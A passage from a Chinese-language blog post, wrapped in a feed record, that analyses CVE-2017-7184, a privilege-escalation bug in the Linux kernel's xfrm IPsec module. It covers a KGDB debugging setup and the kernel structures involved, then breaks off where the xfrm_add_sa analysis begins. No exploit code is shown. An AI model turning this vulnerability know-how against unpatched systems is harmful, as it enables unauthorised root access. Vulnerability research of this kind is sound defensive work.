{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-13 05:12:44","updatedTime":"2020-10-13 05:12:44","title":"Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）","link":"http://p4nda.top/2019/02/16/CVE-2017-7184/","description":"<p>本次漏洞分析基于<code>Linux 4.4.0-21-generic</code>版本，即<code>Ubuntu 16.04.1</code>。镜像可从<a href=\"http://old-releases.ubuntu.com/releases/16.04.1/ubuntu-16.04-desktop-amd64.iso\" target=\"_blank\" rel=\"noopener\">此处</a>下载，文中涉及的脚本可从<a href=\"https://github.com/ret2p4nda/kernel-pwn/blob/master/CVE-2017-7184\" target=\"_blank\" rel=\"noopener\">此处</a>下载。</p>\n<p>本文的先知链接：<a href=\"https://xz.aliyun.com/t/4133\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/4133</a></p>\n<h1 id=\"双机调试环境搭建\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#双机调试环境搭建\" class=\"headerlink\" title=\"双机调试环境搭建\"></a>双机调试环境搭建</h1>\n<p>本次分析没有采用<code>QEMU</code>，而是用了<code>VMware</code>来进行双机调试，给我个人的感觉就是很慢，而且符号表不全很多函数都被编译优化掉了。调试环境构建参考了<a href=\"https://bbs.pediy.com/thread-249192.htm\" target=\"_blank\" rel=\"noopener\">《ubuntu 内核源码调试方法（双机调试》</a>，由于我已经有了一个调试虚拟机（debugging），所以仅需利用上述镜像构建被调试机（debuggee）。</p>\n<h2 id=\"debugging环境配置\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#debugging环境配置\" class=\"headerlink\" title=\"debugging环境配置\"></a>debugging环境配置</h2>\n<p>由于主要的调试时在<code>debugging</code>上完成的，所以大部分的程序包都需要安装在debugging上。</p>\n<p><strong>dbsym安装</strong></p>\n<p>这个就是带有符号表的vmlinux文件，需要根据debuggee来确定。</p>\n<p>如在<code>debuggee</code>上利用<code>uname -sr</code>命令得到的结果是<code>Linux 4.4.0-21-generic</code>，则需要下载安装<code>vmlinux-4.4.0-21-generic</code>。</p>\n<p>首先需要更新源文件，执行命令如下：</p>\n<figure class=\"highlight bash\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 增加source.list</span></span><br><span class=\"line\">codename=$(lsb_release -c | awk <span class=\"string\">'{print $2}'</span>)</span><br><span class=\"line\">sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOF</span><br><span class=\"line\">deb http://ddebs.ubuntu.com/ <span class=\"variable\">${codename}</span> main restricted universe multiverse</span><br><span class=\"line\">deb http://ddebs.ubuntu.com/ <span class=\"variable\">${codename}</span>-security main restricted universe multiverse</span><br><span class=\"line\">deb http://ddebs.ubuntu.com/ <span class=\"variable\">${codename}</span>-updates main restricted universe multiverse</span><br><span class=\"line\">deb http://ddebs.ubuntu.com/ <span class=\"variable\">${codename}</span>-proposed main restricted universe multiverse</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"comment\"># 添加访问符号服务器的秘钥文件</span></span><br><span class=\"line\">wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -</span><br><span class=\"line\"><span class=\"comment\"># 更新源文件</span></span><br><span class=\"line\">sudo apt-get update</span><br /></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>然后利用apt-get下载这个文件：</p>\n<figure class=\"highlight bash\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">sudo apt-get install linux-image-4.4.0-21-generic-dbgsym</span><br /></pre></td>\n  </tr>\n </table>\n</figure>\n<p>然后进入漫长的等待，最终在<code>/usr/lib/debug/boot/vmlinux-4.4.0-21-generic</code>这里可以找到。</p>\n<p><strong>源码下载与配置</strong></p>\n<p>我采用了比较粗暴的方法，直接下载<code>linux 4.4.0</code>版本的源码，命令如下：</p>\n<figure class=\"highlight bash\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启用deb-src</span></span><br><span class=\"line\">deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted</span><br><span class=\"line\"><span class=\"comment\">#搜索源码：</span></span><br><span class=\"line\">apt-cache search linux-source</span><br><span class=\"line\"><span class=\"comment\">#安装指定版本的源码：</span></span><br><span class=\"line\">sudo apt-get install linux-source-4.4.0</span><br /></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>默认下载的源码会放在<code>/usr/src/linux-source-4.4.0/linux-source-4.4.0.tar.bz2</code>。并将其解压到<code>/build/linux-Ay7j_C/linux-4.4.0</code>目录下就可以在调试的时候看到源码。原因是调试符号中包含的路径是编译时的硬编码路径，因此其他Ubuntu版本在调试时可找到这个硬编码路径，将源码解压到此处即可。</p>\n<p><strong>设置通信串口</strong></p>\n<p>需要为<code>debugging</code>添加通信的串口，其调试原理是两虚拟机通过物理实体机的串口进行通信，远程调试。</p>\n<p>对<code>debugging</code>的设置如下，命名管道如果<strong>物理机</strong>是<code>Windows</code>系统，则为<code>//./pipe/com_1</code>。<code>Linux</code>系统为<code>/tmp/serial</code>。由于存在打印机设备可能占用<code>/dev/ttyS0设备</code>，因此在<code>debugging</code>和<code>debuggee</code>中，我均删除了这个硬件。</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/d9e4cccely1g08cr63vyoj20kp0jxwf3.jpg\" alt=\"debugging\" /></p>\n<p><strong>编写调试脚本</strong></p>\n<p>调试脚本即<code>gdb</code>所执行的命令，用于远程调试<code>debuggee</code>。此脚本需要<code>sudo</code>执行。</p>\n<figure class=\"highlight bash\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br /></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">gdb \\</span><br><span class=\"line\">    -ex <span class=\"string\">\"add-auto-load-safe-path <span class=\"variable\">$(pwd)</span>\"</span> \\</span><br><span class=\"line\">    -ex <span class=\"string\">\"file /usr/lib/debug/boot/vmlinux-4.4.0-21-generic\"</span> \\</span><br><span class=\"line\">    -ex <span class=\"string\">'set arch i386:x86-64:intel'</span> \\</span><br><span class=\"line\">    -ex <span class=\"string\">'target remote /dev/ttyS0'</span> \\</span><br><span class=\"line\"> -ex <span class=\"string\">'continue'</span> \\</span><br><span class=\"line\"> -ex <span class=\"string\">'disconnect'</span> \\</span><br><span class=\"line\"> -ex <span class=\"string\">'set arch i386:x86-64'</span> \\</span><br><span class=\"line\"> -ex <span class=\"string\">'target remote /dev/ttyS0'</span></span><br /></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<h2 id=\"debuggee环境配置\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#debuggee环境配置\" class=\"headerlink\" title=\"debuggee环境配置\"></a>debuggee环境配置</h2>\n<p><strong>启动项设置</strong></p>\n<p>首先需要在为待调试的内核设置一个新的启动项，使其开机时进入调试模式，等待链接。</p>\n<p>具体操作是编辑<code>/etc/grub.d/40_custom</code>，在其中加入</p>\n<figure class=\"highlight bash\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"built_in\">exec</span> tail -n +3 <span class=\"variable\">$0</span></span><br><span class=\"line\"><span class=\"comment\"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class=\"line\"><span class=\"comment\"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class=\"line\"><span class=\"comment\"># the 'exec tail' line above.</span></span><br><span class=\"line\">menuentry <span class=\"string\">'Ubuntu, KGDB with nokaslr'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class=\"variable\">$menuentry_id_option</span> <span class=\"string\">'gnulinux-simple-b5907b23-09bb-4b75-bd51-eb04048e56d8'</span> {</span><br><span class=\"line\">recordfail</span><br><span class=\"line\">load_video</span><br><span class=\"line\">gfxmode <span class=\"variable\">$linux_gfx_mode</span></span><br><span class=\"line\">insmod gzio</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ x<span class=\"variable\">$grub_platform</span> = xxen ]; <span class=\"keyword\">then</span> insmod xzio; insmod lzopio; <span class=\"keyword\">fi</span></span><br><span class=\"line\">insmod part_msdos</span><br><span class=\"line\">insmod ext2</span><br><span class=\"line\"><span class=\"built_in\">set</span> root=<span class=\"string\">'hd0,msdos1'</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ x<span class=\"variable\">$feature_platform_search_hint</span> = xy ]; <span class=\"keyword\">then</span></span><br><span class=\"line\"> search --no-floppy --fs-uuid --<span class=\"built_in\">set</span>=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1 b5907b23-09bb-4b75-bd51-eb04048e56d8</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\"> search --no-floppy --fs-uuid --<span class=\"built_in\">set</span>=root b5907b23-09bb-4b75-bd51-eb04048e56d8</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"> <span class=\"built_in\">echo</span> <span class=\"string\">'Loading Linux 4.10.0-19 with KGDB built by GEDU lab...'</span></span><br><span class=\"line\">linux/boot/vmlinuz-4.4.0-21-generic root=UUID=b5907b23-09bb-4b75-bd51-eb04048e56d8 ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr</span><br><span class=\"line\"> <span class=\"built_in\">echo</span> <span class=\"string\">'Loading initial ramdisk ...'</span></span><br><span class=\"line\">initrd/boot/initrd.img-4.4.0-21-generic</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>其中参数可参考<code>/boot/grub/grub.cfg</code>文件，修改完成后执行<code>sudo update-grub</code>命令。</p>\n<p><strong>设置通信串口</strong></p>\n<p><code>debuggee</code>通信串口的设置与 <code>debugging</code>设置类似，区别仅在于<code>debugging</code>是服务器，<code>debuggee</code>是客户机。</p>\n<hr>\n <p><img src=\"https://wx2.sinaimg.cn/mw690/d9e4cccely1g08crm4y72j20kp0jxt9a.jpg\" alt=\"debuggee\" /></p>\n <h2 id=\"进入调试\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#进入调试\" class=\"headerlink\" title=\"进入调试\"></a>进入调试</h2>\n <p>在<code>debugging</code>启动时，按住<code>shift</code>，出现如下界面，选择<code>KGDB with nokaslr</code>。</p>\n <p><img src=\"https://ws4.sinaimg.cn/mw690/d9e4cccely1g08d59bb1sj20i00drgli.jpg\" alt=\"\" /></p>\n <p>系统进入远程调试等待。</p>\n <p><img src=\"https://ws1.sinaimg.cn/mw690/d9e4cccely1g08d6t6z3fj20lh04dt8i.jpg\" alt=\"\" /></p>\n <p>此时，在<code>debugging</code>中执行<code>sudo ./gdb_kernel</code>，就可以远程调试了。</p>\n <p><img src=\"https://wx2.sinaimg.cn/mw690/d9e4cccely1g08d88sb32j20vs0lfjwr.jpg\" alt=\"\" /></p>\n <h1 id=\"漏洞分析\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1>\n <p>漏洞位于内核<code>xfrm</code>模块，该模块是<code>IPSEC</code>协议的实现模块。其中<code>xfrm_state</code>结构体用于表示一个<code>SA(Security Associstion)</code>，<code>AH</code>及<code>ESP</code>协议数据包可通过<code>SA</code>进行检查，其数据结构如下：</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state</span> {</span></span><br><span class=\"line\"><span class=\"keyword\">possible_net_t</span>xs_net;</span><br><span class=\"line\"><span class=\"keyword\">union</span> {</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span><span class=\"title\">gclist</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span><span class=\"title\">bydst</span>;</span></span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span><span class=\"title\">bysrc</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span><span class=\"title\">byspi</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">atomic_t</span>refcnt;</span><br><span class=\"line\"><span class=\"keyword\">spinlock_t</span>lock;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_id</span><span class=\"title\">id</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_selector</span><span class=\"title\">sel</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mark</span><span class=\"title\">mark</span>;</span></span><br><span class=\"line\">u32tfcpad;</span><br><span class=\"line\"></span><br><span class=\"line\">u32genid;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Key manager bits */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state_walk</span><span class=\"title\">km</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Parameters of this state. */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">u32reqid;</span><br><span class=\"line\">u8mode;</span><br><span class=\"line\">u8replay_window;</span><br><span class=\"line\">u8aalgo, ealgo, calgo;</span><br><span class=\"line\">u8flags;</span><br><span class=\"line\">u16family;</span><br><span class=\"line\"><span class=\"keyword\">xfrm_address_t</span>saddr;</span><br><span class=\"line\"><span class=\"keyword\">int</span>header_len;</span><br><span class=\"line\"><span class=\"keyword\">int</span>trailer_len;</span><br><span class=\"line\">u32extra_flags;</span><br><span class=\"line\">} props;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_lifetime_cfg</span> <span class=\"title\">lft</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Data for transformer */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_algo_auth</span>*<span class=\"title\">aalg</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_algo</span>*<span class=\"title\">ealg</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_algo</span>*<span class=\"title\">calg</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_algo_aead</span>*<span class=\"title\">aead</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*geniv;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Data for encapsulator */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_encap_tmpl</span>*<span class=\"title\">encap</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Data for care-of address */</span></span><br><span class=\"line\"><span class=\"keyword\">xfrm_address_t</span>*coaddr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* IPComp needs an IPIP tunnel for handling uncompressed packets */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state</span>*<span class=\"title\">tunnel</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* If a tunnel, number of users + 1 */</span></span><br><span class=\"line\"><span class=\"keyword\">atomic_t</span>tunnel_users;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* State for replay detection */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state</span> <span class=\"title\">replay</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> *<span class=\"title\">replay_esn</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Replay detection state at the time we sent the last notification */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state</span> <span class=\"title\">preplay</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> *<span class=\"title\">preplay_esn</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* The functions for replay detection. */</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay</span> *<span class=\"title\">repl</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* internal flag that only holds state for delayed aevent at the</span></span><br><span class=\"line\"><span class=\"comment\"> * moment</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">u32xflags;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Replay detection notification settings */</span></span><br><span class=\"line\">u32replay_maxage;</span><br><span class=\"line\">u32replay_maxdiff;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Replay detection notification timer */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">timer_list</span><span class=\"title\">rtimer</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Statistics */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_stats</span><span class=\"title\">stats</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_lifetime_cur</span> <span class=\"title\">curlft</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tasklet_hrtimer</span><span class=\"title\">mtimer</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* used to fix curlft-&gt;add_time when changing date */</span></span><br><span class=\"line\"><span class=\"keyword\">long</span>saved_tmo;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Last used time */</span></span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>lastused;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Reference to data common to all the instances of this</span></span><br><span class=\"line\"><span class=\"comment\"> * transformer. */</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_type</span>*<span class=\"title\">type</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mode</span>*<span class=\"title\">inner_mode</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mode</span>*<span class=\"title\">inner_mode_iaf</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mode</span>*<span class=\"title\">outer_mode</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Security context */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_sec_ctx</span>*<span class=\"title\">security</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Private data of this transformer, format is opaque,</span></span><br><span class=\"line\"><span class=\"comment\"> * interpreted by xfrm_type methods. */</span></span><br><span class=\"line\"><span class=\"keyword\">void</span>*data;</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>其中，<code>struct xfrm_id id;</code>用于标识一个<code>SA</code>身份，包含<code>daddr、spi、proto</code>三个参数。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br /></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_id</span> {</span></span><br><span class=\"line\"><span class=\"keyword\">xfrm_address_t</span>daddr;</span><br><span class=\"line\">__be32spi;</span><br><span class=\"line\">__u8proto;</span><br><span class=\"line\">};</span><br /></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>此外，<code>SA</code>还包括一个<code>xfrm_replay_state_esn</code>结构体，该结构体定义如下。其中bmp是一个边长的内存区域，是一块<code>bitmap</code>，用于标识数据包的<code>seq</code>是否被重放过，其中<code>bmp_len</code>表示变长结构体的大小，replay_window用于<code>seq</code>索引的模数，即索引的范围，此结构体在创建<code>xfrm_state</code>结构体时根据用户输入参数动态被创建，而程序漏洞存在于这个结构体的读写过程中。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br /></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> {</span></span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>bmp_len;</span><br><span class=\"line\">__u32oseq;</span><br><span class=\"line\">__u32seq;</span><br><span class=\"line\">__u32oseq_hi;</span><br><span class=\"line\">__u32seq_hi;</span><br><span class=\"line\">__u32replay_window;</span><br><span class=\"line\">__u32bmp[<span class=\"number\">0</span>];</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <h2 id=\"xfrm-state结构体生成\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#xfrm-state结构体生成\" class=\"headerlink\" title=\"xfrm_state结构体生成\"></a>xfrm_state结构体生成</h2>\n <p>该结构体生成位于<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L616\" target=\"_blank\" rel=\"noopener\">xfrm_add_sa</a>函数中，在[1]处对用户输入数据进行参数及协议检查，在[2]处对根据用户输入对结构体进行构造，并放入SA结构体的哈希链表中</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span 